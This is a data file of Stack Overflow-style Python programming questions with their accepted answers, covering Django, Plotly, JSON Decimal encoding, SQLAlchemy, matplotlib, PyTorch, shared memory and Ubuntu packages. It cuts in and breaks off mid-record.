validate(something, failure_handler = default_handler) -> None:\n    if a:\n        failure_handler(ErrorA())\n    if b:\n        failure_handler(ErrorB())\n    if c:\n        failure_handler(ErrorC())\n\nThis allows the caller to change the effect handling by supplying a different handler.\ndef ignore_b_handler(failure: BaseException):\n    if not isinstance(failure, ErrorB):\n        raise failure\n\nvalidate(..., ignore_b_handler)\n\nThis might seem familiar to dependency inversion and is in fact related to it.\nThere are various stages of buying into effect handling, and it is possible to reproduce much if not all features via classes. Aside from technical functionality, one can implement ambient effect handlers (similar to how try \"connects\" to raise automatically) via thread local or context-local variables.\n"
}
{
    "Id": 73820642,
    "PostTypeId": 1,
    "Title": "Always Defer a Field in Django",
    "Body": "How do I make a field on a Django model deferred for all queries of that model without needing to put a defer on every query?\nResearch\nThis was requested as a feature in 2014 and rejected in 2022.\nBaring such a feature native to Django, the obvious idea is to make a custom manager like this:\nclass DeferedFieldManager(models.Manager):\n\n    def __init__(self, defered_fields=[]):\n        super().__init__()\n        self.defered_fields = defered_fields\n\n    def get_queryset(self, *args, **kwargs):\n        return super().get_queryset(*args, **kwargs\n            ).defer(*self.defered_fields)\n\nclass B(models.Model):\n    pass\n\nclass A(models.Model):\n    big_field = models.TextField(null=True)\n    b = models.ForeignKey(B, related_name=\"a_s\")\n\n    objects = DeferedFieldManager([\"big_field\"])\n\nclass C(models.Model):\n    a = models.ForeignKey(A)\n\nclass D(models.Model):\n    a = models.OneToOneField(A)\n\nclass E(models.Model):\n    a_s = models.ManyToManyField(A)\n\n\nHowever, while this works for A.objects.first() (direct lookups), it doesn't work for B.objects.first().a_s.all() (one-to-manys), C.objects.first().a (many-to-ones), D.objects.first().a (one-to-ones), or E.objects.first().a_s.all() (many-to-manys).\nThe thing I find particularly confusing here is that this is the default manager for my object, which means it should also be the default for the reverse lookups (the one-to-manys and many-to-manys), yet this isn't working.  Per the Django docs:\n\nBy default the RelatedManager used for reverse relations is a subclass of the default manager for that model.\n\nAn easy way to test this is to drop the field that should be deferred from the database, and the code will only error with an OperationalError: no such column if the field is not properly deferred.  To test, do the following steps:\n\nData setup:\nb = B.objects.create()\na = A.objects.create(b=b)\nc = C.objects.create(a=a)\nd = D.objects.create(a=a)\ne = E.objects.create()\ne.a_s.add(a)\n\n\nComment out big_field\nmanage.py makemigrations\nmanage.py migrate\nComment in big_field\nRun tests:\nfrom django.db import OperationalError\ndef test(test_name, f, attr=None):\n    try:\n        if attr:\n            x = getattr(f(), attr)\n        else:\n            x = f()\n        assert isinstance(x, A)\n        print(f\"{test_name}:\\tpass\")\n    except OperationalError:\n        print(f\"{test_name}:\\tFAIL!!!\")\n\ntest(\"Direct Lookup\", A.objects.first)\ntest(\"One-to-Many\", B.objects.first().a_s.first)\ntest(\"Many-to-One\", C.objects.first, \"a\")\ntest(\"One-to-One\", D.objects.first, \"a\")\ntest(\"Many-to-Many\", E.objects.first().a_s.first)\n\n\n\nIf the tests above all pass, the field has been properly deferred.\nI'm currently getting:\nDirect Lookup:  pass\nOne-to-Many:    FAIL!!!\nMany-to-One:    FAIL!!!\nOne-to-One:     FAIL!!!\nMany-to-Many:   FAIL!!!\n\nPartial Answer\n@aaron's answer solves half of the failing cases.\nIf I change A to have:\nclass Meta:\n    base_manager_name = 'objects'\n\nI now get the following from tests:\nDirect Lookup:  pass\nOne-to-Many:    FAIL!!!\nMany-to-One:    pass\nOne-to-One:     pass\nMany-to-Many:   FAIL!!!\n\nThis still does not work for the revere lookups.\n",
    "AcceptedAnswerId": 73938166,
    "AcceptedAnswer": "Set Meta.base_manager_name to 'objects'.\nclass A(models.Model):\n    big_field = models.TextField(null=True)\n    b = models.ForeignKey(B, related_name=\"a_s\")\n\n    objects = DeferedFieldManager([\"big_field\"])\n\n    class Meta:\n        base_manager_name = 'objects'\n\nFrom https://docs.djangoproject.com/en/4.1/topics/db/managers/#using-managers-for-related-object-access:\n\nUsing managers for related object access\nBy default, Django uses an instance of the Model._base_manager manager class when accessing related objects (i.e. choice.question), not the _default_manager on the related object. This is because Django needs to be able to retrieve the related object, even if it would otherwise be filtered out (and hence be inaccessible) by the default manager.\nIf the normal base manager class (django.db.models.Manager) isn\u2019t appropriate for your circumstances, you can tell Django which class to use by setting Meta.base_manager_name.\n\nReverse Many-to-One and Many-to-Many managers\nThe \"One-To-Many\" case in the question is a Reverse Many-To-One.\nDjango subclasses the manager class to override the behaviour, and then instantiates it \u2014 without the defered_fields argument passed to __init__ since\ndjango.db.models.Manager and its subclasses are not expected to have parameters.\nThus, you need something like:\ndef make_defered_field_manager(defered_fields):\n    class DeferedFieldManager(models.Manager):\n        def get_queryset(self, *args, **kwargs):\n            return super().get_queryset(*args, **kwargs).defer(*defered_fields)\n    return DeferedFieldManager()\n\nUsage:\n# objects = DeferedFieldManager([\"big_field\"])\nobjects = make_defered_field_manager([\"big_field\"])\n\n"
}
{
    "Id": 73668088,
    "PostTypeId": 1,
    "Title": "Can we use Plotly Express to plot zip codes?",
    "Body": "I'm using the code from this link.\nhttps://devskrol.com/2021/12/27/choropleth-maps-using-python/\nHere's my actual code.\nimport plotly.express as px\n \nfrom urllib.request import urlopen\nimport json\nwith urlopen('https://raw.githubusercontent.com/plotly/datasets/master/geojson-counties-fips.json') as response:\n    counties = json.load(response)\n    \n#import libraries\nimport pandas as pd\nimport plotly.express as px\n \n\nfig = px.choropleth(df_mover, geojson=counties, \n                    locations='my_zip', \n                    locationmode=\"USA-states\", \n                    color='switcher_flag',\n                    range_color=(10000, 100000),\n                    scope=\"usa\"\n                    )\nfig.update_layout(margin={\"r\":0,\"t\":0,\"l\":0,\"b\":0})\nfig.show()\n\nI'm simply trying to pass in data from my dataframe named df_movers, which has two fields: my_zip and switcher_flag. When I run this in a Jupyter notebook, it just runs and runs; it never stops. I'm only trying to plot 25 records, so it's not like there's too much data here. Finally, my_zip is data type object. Any idea what could be wrong here?\n",
    "AcceptedAnswerId": 73669375,
    "AcceptedAnswer": "Since you did not provide any user data, I tried your code with data including US zip codes from here. I think the issue is that you don't need to specify the location mode. I specified county_fips for the location and population for the color fill.\nimport plotly.express as px\nfrom urllib.request import urlopen\nimport json\nwith urlopen('https://raw.githubusercontent.com/plotly/datasets/master/geojson-counties-fips.json') as response:\n    counties = json.load(response)\n    \n#import libraries\nimport pandas as pd\nus_zip = pd.read_csv('data/uszips.csv', dtype={'county_fips': str}) \n\nfig = px.choropleth(us_zip,\n                    geojson=counties, \n                    locations='county_fips', \n                    #locationmode=\"USA-states\", \n                    color='population',\n                    range_color=(1000, 10000),\n                    scope=\"usa\"\n                    )\nfig.update_layout(margin={\"r\":0,\"t\":0,\"l\":0,\"b\":0})\nfig.show()\n\n\n"
}
{
    "Id": 73070247,
    "PostTypeId": 1,
    "Title": "how to change image format when uploading image in django?",
    "Body": "When a user uploads an image from the Django admin panel, I want to change the image format to '.webp'. I have overridden the save method of the model. Webp file is generated in the media/banner folder but the generated file is not saved in the database. How can I achieve that?\ndef save(self, *args, **kwargs):\n    super(Banner, self).save(*args, **kwargs)\n    im = Image.open(self.image.path).convert('RGB')\n    name = 'Some File Name with .webp extention' \n    im.save(name, 'webp')\n    self.image = im\n\nBut After saving the model, instance of the Image class not saved in the database?\nMy Model Class is :\nclass Banner(models.Model):\n    image = models.ImageField(upload_to='banner')\n    device_size = models.CharField(max_length=20, choices=Banner_Device_Choice)\n\n",
    "AcceptedAnswerId": 73430147,
    "AcceptedAnswer": "from django.core.files import ContentFile\n\nIf you already have the webp file, read the webp file, put it into the ContentFile() with a buffer (something like io.BytesIO). Then you can proceed to save the ContentFile() object to a model. Do not forget to update the model field, and save the model!\nhttps://docs.djangoproject.com/en/4.1/ref/files/file/\nAlternatively\n\n\"django-webp-converter is a Django app which straightforwardly converts static images to WebP images, falling back to the original static image for unsupported browsers.\"\n\nIt might have some save capabilities too.\nhttps://django-webp-converter.readthedocs.io/en/latest/\nThe cause\nYou are also saving in the wrong order, the correct order to call the super().save() is at the end.\nEdited, and tested solution:\nfrom django.core.files import ContentFile\nfrom io import BytesIO\n\ndef save(self, *args, **kwargs):\n    #if not self.pk: #Assuming you don't want to do this literally every time an object is saved.\n    img_io = BytesIO()\n    im = Image.open(self.image).convert('RGB')\n    im.save(img_io, format='WEBP')\n    name=\"this_is_my_webp_file.webp\"\n    self.image = ContentFile(img_io.getvalue(), name)\n    super(Banner, self).save(*args, **kwargs) #Not at start  anymore\n    \n\n    \n\n"
}
{
    "Id": 74017216,
    "PostTypeId": 1,
    "Title": "Deserialize json string containing arbitrary-precision float numbers, and serialize it back",
    "Body": "Python has no built-in arbitrary-precision floats. Here is an example:\n>>> float(4.4257052820783003)\n4.4257052820783\n\nSo it doesn't matter what you use, you can't have a float object with arbitrary precision.\nLet's say I have a JSON string (json_string = '{\"abc\": 4.4257052820783003}') containing an arbitrary-precision float. If I load that string, Python will cut the number:\n>>> dct = json.loads(json_string)\n>>> dct\n{'abc': 4.4257052820783}\n\nI managed to avoid this loss of info by using decimal.Decimal:\n>>> dct = json.loads(json_string, parse_float=Decimal)\n>>> dct\n{'abc': Decimal('4.4257052820783003')}\n\nNow, I would like to serialize this dct object to the original JSON formatted string. json.dumps(dct) clearly does not work (because objects of type Decimal are not JSON serializable). I tried to subclass json.JSONEncoder and redefine its default method:\nclass MyJSONEncoder(json.JSONEncoder):\n    def default(self, o):\n        if isinstance(o, Decimal):\n            return str(o)\n        return super().default(o)\n\nBut this is clearly creating a string instead of a number:\n>>> MyJSONEncoder().encode(dct)\n'{\"abc\": \"4.4257052820783003\"}'\n\nHow can I serialize a Decimal object to a JSON number (real) instead of a JSON string? In other words, I want the encode operation to return the original json_string string. Ideally without using external packages (but solutions using external packages are still welcome).\nThis question is of course very related but I can't find an answer there: Python JSON serialize a Decimal object.\n",
    "AcceptedAnswerId": 74106182,
    "AcceptedAnswer": "The following only uses the default library. It works by effectively \"overriding\" json.encoder._make_iterencode (see discussion below, after this example)...\nfrom decimal import Decimal\nimport json\n\ndef _our_make_iterencode(markers, _default, _encoder, _indent, _floatstr,\n        _key_separator, _item_separator, _sort_keys, _skipkeys, _one_shot,\n        ## HACK: hand-optimized bytecode; turn globals into locals\n        ValueError=ValueError,\n        dict=dict,\n        float=float,\n        id=id,\n        int=int,\n        isinstance=isinstance,\n        list=list,\n        str=str,\n        tuple=tuple,\n        _intstr=int.__repr__,\n    ):\n\n    if _indent is not None and not isinstance(_indent, str):\n        _indent = ' ' * _indent\n\n    def _iterencode_list(lst, _current_indent_level):\n\n        if not lst:\n            yield '[]'\n            return\n        if markers is not None:\n            markerid = id(lst)\n            if markerid in markers:\n                raise ValueError(\"Circular reference detected\")\n            markers[markerid] = lst\n        buf = '['\n        if _indent is not None:\n            _current_indent_level += 1\n            newline_indent = '\\n' + _indent * _current_indent_level\n            separator = _item_separator + newline_indent\n            buf += newline_indent\n        else:\n            newline_indent = None\n            separator = _item_separator\n        first = True\n        for value in lst:\n            if first:\n                first = False\n            else:\n                buf = separator\n            if isinstance(value, str):\n                yield buf + _encoder(value)\n            elif value is None:\n                yield buf + 'null'\n            elif value is True:\n                yield buf + 'true'\n            elif value is False:\n                yield buf + 'false'\n            elif isinstance(value, int):\n                # Subclasses of int/float may override __repr__, but we still\n                # want to encode them as integers/floats in JSON. One example\n                # within the standard library is IntEnum.\n                yield buf + _intstr(value)\n            elif isinstance(value, float):\n                # see comment above for int\n                yield buf + _floatstr(value)\n            else:\n                yield buf\n                if isinstance(value, (list, tuple)):\n                    chunks = _iterencode_list(value, _current_indent_level)\n                elif isinstance(value, dict):\n                    chunks = _iterencode_dict(value, _current_indent_level)\n                else:\n                    chunks = _iterencode(value, _current_indent_level)\n                yield from chunks\n        if newline_indent is not None:\n            _current_indent_level -= 1\n            yield '\\n' + _indent * _current_indent_level\n        yield ']'\n        if markers is not None:\n            del markers[markerid]\n\n    def _iterencode_dict(dct, _current_indent_level):\n        if not dct:\n            yield '{}'\n            return\n        if markers is not None:\n            markerid = id(dct)\n            if markerid in markers:\n                raise ValueError(\"Circular reference detected\")\n            markers[markerid] = dct\n        yield '{'\n        if _indent is not None:\n            _current_indent_level += 1\n            newline_indent = '\\n' + _indent * _current_indent_level\n            item_separator = _item_separator + newline_indent\n            yield newline_indent\n        else:\n            newline_indent = None\n            item_separator = _item_separator\n        first = True\n        if _sort_keys:\n            items = sorted(dct.items())\n        else:\n            items = dct.items()\n        for key, value in items:\n            if isinstance(key, str):\n                pass\n            # JavaScript is weakly typed for these, so it makes sense to\n            # also allow them.  Many encoders seem to do something like this.\n            elif isinstance(key, float):\n                # see comment for int/float in _make_iterencode\n                key = _floatstr(key)\n            elif key is True:\n                key = 'true'\n            elif key is False:\n                key = 'false'\n            elif key is None:\n                key = 'null'\n            elif isinstance(key, int):\n                # see comment for int/float in _make_iterencode\n                key = _intstr(key)\n            elif _skipkeys:\n                continue\n            else:\n                raise TypeError(f'keys must be str, int, float, bool or None, '\n                                f'not {key.__class__.__name__}')\n            if first:\n                first = False\n            else:\n                yield item_separator\n            yield _encoder(key)\n            yield _key_separator\n            if isinstance(value, str):\n                yield _encoder(value)\n            elif value is None:\n                yield 'null'\n            elif value is True:\n                yield 'true'\n            elif value is False:\n                yield 'false'\n            elif isinstance(value, int):\n                # see comment for int/float in _make_iterencode\n                yield _intstr(value)\n            elif isinstance(value, float):\n                # see comment for int/float in _make_iterencode\n                yield _floatstr(value)\n            else:\n                if isinstance(value, (list, tuple)):\n                    chunks = _iterencode_list(value, _current_indent_level)\n                elif isinstance(value, dict):\n                    chunks = _iterencode_dict(value, _current_indent_level)\n                else:\n                    chunks = _iterencode(value, _current_indent_level)\n                yield from chunks\n        if newline_indent is not None:\n            _current_indent_level -= 1\n            yield '\\n' + _indent * _current_indent_level\n        yield '}'\n        if markers is not None:\n            del markers[markerid]\n\n    def _iterencode(o, _current_indent_level):\n        if isinstance(o, str):\n            yield _encoder(o)\n        elif isinstance(o, Decimal):\n            yield str(o) # unquoted string.\n        elif o is None:\n            yield 'null'\n        elif o is True:\n            yield 'true'\n        elif o is False:\n            yield 'false'\n        elif isinstance(o, int):\n            # see comment for int/float in _make_iterencode\n            yield _intstr(o)\n        elif isinstance(o, float):\n            # see comment for int/float in _make_iterencode\n            yield _floatstr(o)\n        elif isinstance(o, (list, tuple)):\n            yield from _iterencode_list(o, _current_indent_level)\n        elif isinstance(o, dict):\n            yield from _iterencode_dict(o, _current_indent_level)\n        else:\n            if markers is not None:\n                markerid = id(o)\n                if markerid in markers:\n                    raise ValueError(\"Circular reference detected\")\n                markers[markerid] = o\n            o = _default(o)\n            yield from _iterencode(o, _current_indent_level)\n            if markers is not None:\n                del markers[markerid]\n    return _iterencode\n\nclass BigDecimalJSONEncoder(json.JSONEncoder):\n \n    def iterencode(self, o, _one_shot=False):\n        \"\"\"Encode the given object and yield each string\n        representation as available.\n\n        For example::\n\n            for chunk in JSONEncoder().iterencode(bigobject):\n                mysocket.write(chunk)\n\n        \"\"\"\n        if self.check_circular:\n            markers = {}\n        else:\n            markers = None\n        if self.ensure_ascii:\n            _encoder = json.encoder.encode_basestring_ascii\n        else:\n            _encoder = json.encoder.encode_basestring\n\n        def floatstr(o, allow_nan=self.allow_nan,\n                _repr=float.__repr__, _inf=json.encoder.INFINITY, _neginf=-json.encoder.INFINITY):\n            # Check for specials.  Note that this type of test is processor\n            # and/or platform-specific, so do tests which don't depend on the\n            # internals.\n\n            if o != o:\n                text = 'NaN'\n            elif o == _inf:\n                text = 'Infinity'\n            elif o == _neginf:\n                text = '-Infinity'\n            else:\n                return _repr(o)\n\n            if not allow_nan:\n                raise ValueError(\n                    \"Out of range float values are not JSON compliant: \" +\n                    repr(o))\n\n            return text\n\n        _one_shot = False\n        if (_one_shot and json.encoder.c_make_encoder is not None\n                and self.indent is None):\n            _iterencode = json.encoder.c_make_encoder(\n                markers, self.default, _encoder, self.indent,\n                self.key_separator, self.item_separator, self.sort_keys,\n                self.skipkeys, self.allow_nan)\n        else:\n            _iterencode = _our_make_iterencode(\n                markers, self.default, _encoder, self.indent, floatstr,\n                self.key_separator, self.item_separator, self.sort_keys,\n                self.skipkeys, _one_shot)\n        return _iterencode(o, 0)\n\njson_string = '{\"abc\": 4.4257052820783003}'\ndct = json.loads(json_string, parse_float=Decimal)\nprint(f\"decoded={dct}\")\nprint(f\"encoded={json.dumps(dct, cls=BigDecimalJSONEncoder, indent=4)}\")\n\nExample output:\ndecoded={'abc': Decimal('4.4257052820783003')}\nencoded={\n    \"abc\": 4.4257052820783003\n}\n\nDiscussion:\nThe main problem is that json.encoder does not provide an acceptable way to override json.JSONEncoder to a return string (i.e., from json.JSONEncoder.default) that is to be accepted as raw ready-to-go JSON string.\nFor example, consider the following pseudo ideal override...\nclass IdealDecimalEncoder(json.JSONEncoder):\n    def default(self, o) -> Union[Any, tuple[str, bool]]:\n        if isinstance(o, Decimal):\n            return str(o), False # return object (str) and False which means \"do not quote\".\n        return super().default(o)\n\nThe above allows default to return the object (as it does today) or a tuple, where the second value is False if no further encoding should be performed (i.e., a string that should not be quoted). As we know, this is not supported.\nThe next question would then be, what lies between the call to default and iterencode... unfortunately, it's the json.encoder._make_iterencode function which essentially produces a generator that relies on several \"private\" functions. If this were a class, or if the functions were broken out and accessible, you could perform a more terse override.\nIn my working example above, I essentially copy/pasted _make_iterencode simply to add the following single case to the private _iterencode generator...\n    ...\n    elif isinstance(o, Decimal):\n        yield str(o) # unquoted string.\n    ...\n\nThis obviously works because it returns an unquoted string. The 'str' case always uses _encoder which assumes a string requiring quotes for JSON, where the override bypasses that for Decimal.\nNot a great solution but the only reasonable one I can see which uses only the built-in library which does not require parsing/decoding/modifying encoded JSON during the encoding process.\nIt has not been tested beyond the @Riccardo Bucco (OP)'s example.\nAssuming no unforeseen back-compat issue, it seems it would be a relatively easy to modify Python to include this for Decimal.\nWithout something built in, I'm wondering if it's best, for now, to use one of the other JSON libraries supporting Decimal as others have discussed.\n"
}
{
    "Id": 73623986,
    "PostTypeId": 1,
    "Title": "SQLAlchemy How to create a composite index between a polymorphic class and it's subclass",
    "Body": "I am trying to get a composite index working between a polymorphic subclass and it's parent.\nAlembic autogenerate does not seem to detect Indexes outside of __table_args__.\nI can't use __table_args__ because, being in the subclass, it does not count my class as having a __table__.\nHow do I create a composite Index between these?\nclass Main(Base, SomeMixin):\n    __tablename__ = \"main\"\n    __table_args__ = (\n        # Some constraints and Indexes specific to main\n    )\n\n    id = Column(String, primary_key=True, default=func.generate_object_id())\n\n    mtype = Column(String, nullable=False)\n\n    __mapper_args__ = {\"polymorphic_on\": mtype}\n\nclass SubClass(Main):\n    __mapper_args__ = {\"polymorphic_identity\": \"subclass\"}\n\n    bid = Column(String, ForeignKey(\"other.id\", ondelete=\"CASCADE\"))\n\n    # My index specific to Subclass\n    Index(\n        \"ix_main_bid_mtype\",\n        \"bid\",\n        \"mtype\",\n    )\n\nThe goal is to have something like this pop with alembic autogenerate:\ndef upgrade():\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.create_index(\n        \"ix_main_bid_mtype\",\n        \"main\",\n        [\"bid\", \"mtype\"],\n        unique=False,\n    )\n    # ### end Alembic commands ###\n\n\ndef downgrade():\n    # ### commands auto generated by Alembic - please adjust! ###\n    op.drop_index(op.f(\"ix_main_bid_mtype\"), table_name=\"main\")\n    # ### end Alembic commands ###\n\nThank you for your time and potential future help.\nEDIT:\nNote: The other fields are detected by autogenerate, only the index done this way does not seem to work.\n",
    "AcceptedAnswerId": 73675717,
    "AcceptedAnswer": "Create the index externally after both classes:\nclass Main(Base, SomeMixin):\n    __tablename__ = \"main\"\n    __table_args__ = (\n        # Some constraints and Indexes specific to main\n    )\n\n    id = Column(String, primary_key=True, default=func.generate_object_id())\n\n    mtype = Column(String, nullable=False)\n\n    __mapper_args__ = {\"polymorphic_on\": mtype}\n\n\nclass SubClass(Main):\n    __mapper_args__ = {\"polymorphic_identity\": \"subclass\"}\n\n    bid = Column(String, ForeignKey(\"other.id\", ondelete=\"CASCADE\"))\n\n\nIndex(\"ix_main_bid_mtype\", SubClass.bid, SubClass.mtype)\n\n"
}
{
    "Id": 73485081,
    "PostTypeId": 1,
    "Title": "Save the multiple images into PDF without chainging the format of Subplot",
    "Body": "I've a df like this as shown below. What I'm doing is I'm trying to loop through the df column(s) with paths & printing the image as sub plots one column with image paths at axis0 and other column paths parallely on axis1 as follows.\n      identity       VGG-Face_cosine    img                 comment\n0   ./clip_v4/3.png   1.110223e-16  .\\clip_v3\\0.png        .\\clip_v3\\0.png is matched with ./clip_v4/3.png\n0   ./clip_v4/2.png   2.220446e-16  .\\clip_v3\\1.png        .\\clip_v3\\1.png is matched with ./clip_v4/2.png\n1   ./clip_v4/4.png   2.220446e-16  .\\clip_v3\\1.png        .\\clip_v3\\1.png is matched with ./clip_v4/4.png\n2   ./clip_v4/5.png   2.220446e-16  .\\clip_v3\\1.png        .\\clip_v3\\1.png is matched with ./clip_v4/5.png\n0   ./clip_v4/2.png   2.220446e-16  .\\clip_v3\\2.png        .\\clip_v3\\2.png is matched with \n\nI'm looping through these 2 columns identity  and  img columns & plotting as follows\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport matplotlib.image as mpimg\nfrom matplotlib import rcParams\n\n\ndf = df.iloc[1:]\n#merged_img = []\n\n\nfor index, row in df.iterrows():\n\n    # figure size in inches optional\n    rcParams['figure.figsize'] = 11 ,8\n\n    # read images\n    \n    img_A = mpimg.imread(row['identity'])\n    img_B = mpimg.imread(row['img'])\n\n    # display images\n    fig, ax = plt.subplots(1,2)\n \n    \n    ax[0].imshow(img_A)\n    ax[1].imshow(img_B)\n    \n    \n\nsample output I got.\n###Console output\n\nUpto now it's fine. My next idea is to save these images as it is with sublots on PDF. I don't want to change the structure the way it prints. Like I just want 2 images side by side in PDF too. I've went through many available solutions. But, I can't relate my part of code with the logic avaiable in documentation. Is there is any way to achieve my goal?. Any references would be helpful!!. Thanks in advance.\n",
    "AcceptedAnswerId": 73530424,
    "AcceptedAnswer": "Use PdfPages from matplotlib.backends.backend_pdf to save figures one by one on separate pages of the same pdf-file:\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport matplotlib.image as mpimg\nfrom matplotlib import rcParams\nfrom matplotlib.backends.backend_pdf import PdfPages\n\ndf = df.iloc[1:]\nrcParams['figure.figsize'] = 11 ,8\npdf_file_name = 'my_images.pdf' \n\nwith PdfPages(pdf_file_name) as pdf:\n\n    for index, row in df.iterrows():\n        img_A = mpimg.imread(row['identity'])\n        img_B = mpimg.imread(row['img'])\n        fig, ax = plt.subplots(1,2)\n        ax[0].imshow(img_A)\n        ax[1].imshow(img_B)\n\n        # save the current figure at a new page in pdf_file_name\n        pdf.savefig()   \n\nSee also https://matplotlib.org/stable/api/backend_pdf_api.html\n"
}
{
    "Id": 74289077,
    "PostTypeId": 1,
    "Title": "AttributeError: '_MultiProcessingDataLoaderIter' object has no attribute 'next'",
    "Body": "I am trying to load the dataset using Torch Dataset and DataLoader, but I got the following error:\nAttributeError: '_MultiProcessingDataLoaderIter' object has no attribute 'next'\n\nthe code I use is:\nclass WineDataset(Dataset):\n\n    def __init__(self):\n        # Initialize data, download, etc.\n        # read with numpy or pandas\n        xy = np.loadtxt('./data/wine.csv', delimiter=',', dtype=np.float32, skiprows=1)\n        self.n_samples = xy.shape[0]\n\n        # here the first column is the class label, the rest are the features\n        self.x_data = torch.from_numpy(xy[:, 1:]) # size [n_samples, n_features]\n        self.y_data = torch.from_numpy(xy[:, [0]]) # size [n_samples, 1]\n\n    # support indexing such that dataset[i] can be used to get i-th sample\n    def __getitem__(self, index):\n        return self.x_data[index], self.y_data[index]\n\n    # we can call len(dataset) to return the size\n    def __len__(self):\n        return self.n_samples\n\n    dataset = WineDataset()\n        \n    train_loader = DataLoader(dataset=dataset,\n                              batch_size=4,\n                              shuffle=True,\n                              num_workers=2)\n\nI tried to make the num_workers=0, still have the same error.\nPython version 3.8.9\nPyTorch version 1.13.0\n\n",
    "AcceptedAnswerId": 74331018,
    "AcceptedAnswer": "I too faced the same issue, when i tried to call the next() method as follows\ndataiter = iter(dataloader)\ndata = dataiter.next()\n\nYou need to use the following instead and it works perfectly:\ndataiter = iter(dataloader)\ndata = next(dataiter)\n\nFinally your code should look like follows:\nclass WineDataset(Dataset):\n\n    def __init__(self):\n        # Initialize data, download, etc.\n        # read with numpy or pandas\n        xy = np.loadtxt('./data/wine.csv', delimiter=',', dtype=np.float32, skiprows=1)\n        self.n_samples = xy.shape[0]\n\n        # here the first column is the class label, the rest are the features\n        self.x_data = torch.from_numpy(xy[:, 1:]) # size [n_samples, n_features]\n        self.y_data = torch.from_numpy(xy[:, [0]]) # size [n_samples, 1]\n\n    # support indexing such that dataset[i] can be used to get i-th sample\n    def __getitem__(self, index):\n        return self.x_data[index], self.y_data[index]\n\n    # we can call len(dataset) to return the size\n    def __len__(self):\n        return self.n_samples\n\n    dataset = WineDataset()\n        \n    train_loader = DataLoader(dataset=dataset,\n                              batch_size=4,\n                              shuffle=True,\n                              num_workers=2)\n\ndataiter = iter(dataloader)\ndata = next(dataiter)\n\n"
}
{
    "Id": 73719101,
    "PostTypeId": 1,
    "Title": "Connecting a C++ program to a Python script with shared memory",
    "Body": "I'm trying to connect a C++ program to python using shared memory but I don't know how to pass the name of the memory segment to python.\nHere is my C++ code:\nkey_t key = ftok(\"address\", 1);\nint shm_o;\nchar* msg = \"hello there\";\nint len = strlen(msg) + 1;\nvoid* addr;\n\nshm_o = shmget(key, 20, IPC_CREAT | 0600);\nif(shm_o == -1)\n{\n    std::cout << \"Failed: shmget.\\n\";\n    return 1;\n}\n\naddr = shmat(shm_o, NULL, 0);\nif(addr == (void*) -1)\n{\n    std::cout << \"Failed: shmat.\\n\";\n    return 1;\n}\n\nstd::cout << \"Shared memory segment created successfully with id: \" << shm_o;\nmemcpy(addr, msg, len);\n\ngetchar();\nreturn 0;\n\nI'm trying to get python to read from the shared memory segment like so:\nshm_a = shared_memory.SharedMemory(name=\"address\", create=False, size=20)\n\nprint(bytes(shm_a.buf[:11]))\n\nbut it throws an exception saying there is no file or directory called 'address'.\nAm I going about this correctly or is there another way to attach python to the shared memory segment?\nAny help would be much appreciated.\n",
    "AcceptedAnswerId": 73720808,
    "AcceptedAnswer": "Taking the liberty to post a working example here for POSIX shared memory segments, which will work across C/C++ and Python on Linux/UNIX-like systems. This will not work on Windows.\nC++ code to create and write data into a shared memory segment (name provided on command line):\n#include \n#include \n#include \n#include \n#include \n\n#include \n#include \n\nint main(int argc, char * argv[])\n{\n    if (argc != 2) {\n         std::cerr  required\" << std::endl;\n         return 1;\n    }\n    const char * shmem_name = argv[1];\n    size_t shm_size = 4096;\n    int shmem_fd = shm_open(shmem_name, O_CREAT|O_RDWR, S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP);\n    if (shmem_fd == -1) {\n         perror(\"shm_open\");\n         return 1;\n    }\n    std::cout << \"Shared Memory segment created with fd \" << shmem_fd << std::endl;\n    if (ftruncate(shmem_fd, shm_size) == -1) {\n        perror(\"ftruncate\");\n        return 1;\n    }\n    std::cout << \"Shared Memory segment resized to \" << shm_size << std::endl;\n    void * addr = mmap(0, shm_size, PROT_WRITE, MAP_SHARED, shmem_fd, 0);\n    if (addr == MAP_FAILED) {\n        perror(\"mmap\");\n        return 1;\n    }\n    std::cout << \"Please enter some text to write to shared memory segment\\n\";\n    std::string text;\n    std::getline(std::cin, text);\n    while (! text.empty()) {\n        strncpy((char *)addr, text.data(), shm_size);\n        std::cout << \"Written '\" << text << \"' to shared memory segment\\n\";\n        std::getline(std::cin, text);\n    }\n    std::cout << \"Unlinking shared memory segment.\" << std::endl;\n    shm_unlink(shmem_name) ;\n}\n\nPython code to read any string from the beginning of the shared memory segment:\nimport sys\nfrom multiprocessing import shared_memory, resource_tracker\n\nif len(sys.argv) != 2:\n    print(\"Argument  required\")\n    sys.exit(1)\n\nshm_seg = shared_memory.SharedMemory(name=sys.argv[1])\nprint(bytes(shm_seg.buf).strip(b'\\x00').decode('ascii'))\nshm_seg.close()\n# Manually remove segment from resource_tracker, otherwise shmem segment\n# will be unlinked upon program exit\nresource_tracker.unregister(shm_seg._name, \"shared_memory\")\n\n"
}
{
    "Id": 73566474,
    "PostTypeId": 1,
    "Title": "Unable to locate package python-openssl",
    "Body": "I'm trying to install Pyenv, and I'm running on Ubuntu 22.04 LTS. but whenever I run this command\nsudo apt install -y make build-essential libssl-dev zlib1g-dev \\ libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev \\ libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev python-openssl \\ git\n\nI get this error\nUnable to locate package python-openssl\n\nI've tried searching for solutions online, but I think they have encountered it on older versions of Ubuntu and not on the latest version.\n",
    "AcceptedAnswerId": 73566675,
    "AcceptedAnswer": "Make sure your list of packages is updated (sudo apt update). Python openssl bindings are available in 22.04 in python3-openssl (link), so you can install it by running\nsudo apt install python3-openssl\n\n"
}
{
    "Id": 74370984,
    "PostTypeId": 1,
    "Title": "Is tkwait wait_variable/wait_window/wait_visibility broken?",
